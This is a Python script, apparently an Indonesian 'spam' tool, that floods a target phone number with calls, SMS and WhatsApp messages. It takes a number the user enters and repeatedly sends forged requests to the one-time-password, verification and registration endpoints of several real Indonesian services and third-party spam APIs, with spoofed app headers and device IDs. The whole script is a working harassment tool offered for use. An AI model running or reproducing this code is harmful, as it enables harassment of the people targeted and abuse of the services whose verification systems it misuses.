import os,sys,time,requests,json,random
from colorama import Back,init,Fore
from random import randrange as rg
os.system("clear")

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text
localtime=time.asctime(time.localtime(time.time()))

Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def tanya():
	tanya=input("Back To Menu (Y or N): ")
	if tanya == "y" or tanya == "Y":
		print ("Waiting...")
		time.sleep(5)
		os.system("python sms.py")
	elif tanya == "n" or tanya == "N":
		exit(f"{W}Terima Kasih Telah Menggunakan Tools Ini {R}! ! !")
	else:
		exit("Masukin Yang Bener Kaka >_<")

def logo():
	os.system("clear")
	time.sleep(3)
	print (f"""
{biru}╔═╗{W}┌─┐┬ ┬┬ ┬┬─┐    {ungu}╦═╗{W}┬─┐┌─┐  ┬┌─┐┬─┐┌┬┐
{biru}╚═╗{W}├─┤├─┤│ │├┬┘ {R}── {ungu}╠═╝{W}├┬┘│ │  │├┤ │   │
{biru}╚═╝{W}┴ ┴┴ ┴└─┘┴└─    {ungu}╩  {W}┴└─└─┘└─┘└─┘└─┘ ┴
{abu} ------------------------------------------
  {W}[{R}•{W}] Creator {R}:{W} AmmarBN
  {W}[{R}•{W}] Youtube {R}:{W} Ammar Executed
  {W}[{R}•{W}] Github  {R}:{W} github.com/Lord-Ammar

   Info Bahasa    {R}:{W} {ua}
{W}   Waktu Local    {R}:{G} {localtime}
{W}   IP Kamu        {R}:{Y} {ip}

{W}  [{R}0{W}] Spam {R}({biru}sms,call,wa{R})
{W}  [{R}1{W}] Spam Sms
{W}  [{R}2{W}] Spam Call
{W}  [{R}3{W}] Spam Wa
{W}  [{R}4{W}] Exit/Keluar
{W}  [{R}5{W}] Back To Menu
""")

def haha():
        os.system("clear")
        time.sleep(3)

def satu():
	os.system("clear")
	print (f"""
{biru}╔═╗{W}┌─┐┬ ┬┬ ┬┬─┐    {ungu}╦═╗{W}┬─┐┌─┐  ┬┌─┐┬─┐┌┬┐
{biru}╚═╗{W}├─┤├─┤│ │├┬┘ {R}── {ungu}╠═╝{W}├┬┘│ │  │├┤ │   │
{biru}╚═╝{W}┴ ┴┴ ┴└─┘┴└─    {ungu}╩  {W}┴└─└─┘└─┘└─┘└─┘ ┴
{abu} ------------------------------------------
  {W}[{R}•{W}] Creator {R}:{W} AmmarBN
  {W}[{R}•{W}] Youtube {R}:{W} Ammar Executed
  {W}[{R}•{W}] Github  {R}:{W} github.com/Lord-Ammar

   Info Bahasa    {R}:{W} {ua}
{W}   Waktu Local    {R}:{G} {localtime}
{W}   IP Kamu        {R}:{Y} {ip}

{W}  [{R}1{W}] Bangunin Sahur dg Spam
{W}  [{R}2{W}] Laporkan Masalah/Bug
{W}  [{R}3{W}] Info Tools
{W}  [{R}4{W}] Exit/Keluar
""")

def Wa():
	os.system("clear")
	print (f"""
{biru}╔═╗{W}┌─┐┬ ┬┬ ┬┬─┐    {ungu}╦═╗{W}┬─┐┌─┐  ┬┌─┐┬─┐┌┬┐
{biru}╚═╗{W}├─┤├─┤│ │├┬┘ {R}── {ungu}╠═╝{W}├┬┘│ │  │├┤ │   │
{biru}╚═╝{W}┴ ┴┴ ┴└─┘┴└─    {ungu}╩  {W}┴└─└─┘└─┘└─┘└─┘ ┴
{abu} ------------------------------------------
  {W}[{R}•{W}] Creator {R}:{W} AmmarBN
  {W}[{R}•{W}] Youtube {R}:{W} Ammar Executed
  {W}[{R}•{W}] Github  {R}:{W} github.com/Lord-Ammar

   Info Bahasa    {R}:{W} {ua}
{W}   Waktu Local    {R}:{G} {localtime}
{W}   IP Kamu        {R}:{Y} {ip}
""")

def call():
	#Ini Spam Call
	url = "https://id.jagreward.com/member/verify-mobile/"
	uaa = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
	dat = {"method": "CALL","countryCode": "id",}
	send = requests.post(url+nomor, headers=uaa, data=dat)
	send2 = requests.post(url+nomor, headers=uaa, data=dat)
	send3 = requests.post(url+nomor, headers=uaa, data=dat)
	print('  \x1b[1;92m✓ \x1b[1;97mSpam Call: ',(send.json()["message"]))
def wa():
	#Ini Spam Wa
	req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
	ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
	data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
	req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
	Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
	print('  \x1b[1;92m✓ \x1b[1;97mSpam Wa Terkirim')
def smscall():
	ammar = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={'phone':nomor}).text
	haha = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={'phone':nomor}).text
	req = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={'phone':nomor}).text
	hah = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={'phone':nomor}).text
	print('  \x1b[1;92m✓ \x1b[1;97mSpam Sms-Call Terkirim')
def sms():
	Wa()
	os.system("python Sms.py")

try:
	satu()
	pil = input(f"{R} > {W}Pilih Menu {R}:{G} ")
	if pil == "1" or pil == "satu":
		logo()
		pil2 = input(f"{R} > {W}Input Menu {R}:{G} ")
		if pil2 == "0" or pil2 == "nol":
			nomor = input(f"{R} > {W}Nomor {R}:{W}")
			smscall()
			wa()
			call()
			smscall()
			wa()
			wa()
			call()
			sms()
			tanya()
		if pil2 == "1" or pil2 == "satu":
			sms()
			tanya()
		if pil2 == "2" or pil2 == "dua":
			nomor = input(f"{R} > {W}Nomor {R}:{W}")
			call()
			smscall()
			call()
			smscall()
			tanya()
		if pil2 == "3" or pil2 == "tiga":
			nomor = input(f"{R} > {W}Nomor {R}:{W}")
			wa()
			wa()
			tanya()
	if pil == "2" or pil == "dua":
		os.system("clear")
		Wa()
		os.system("xdg-open https://wa.me/6288229683561?text=*Report:* ")
		print('  \x1b[1;92m✓ \x1b[1;97mSukses Melaporkan Bug')
		tanya()
	if pil == "3" or pil == "tiga":
		os.system("clear")
		Wa()
		print (f"{W}[{Y}•{W}] Info Tools {R}:{W} Tools Ini Digunakan Untuk Spam Penipu Atau\nBangunin Teman Waktu Sahur atau\nGanggu Teman Waktu Push Rank:v\nCreated By AmmarBN")
		tanya()
	if pil == "4" or pil == "empat":
		exit(f"{W}Terima Kasih Telah Menggunakan Tools Ini {R}! ! !")
except KeyboardInterrupt:
	exit(f"{W}Exited With Code {R}! ! !")
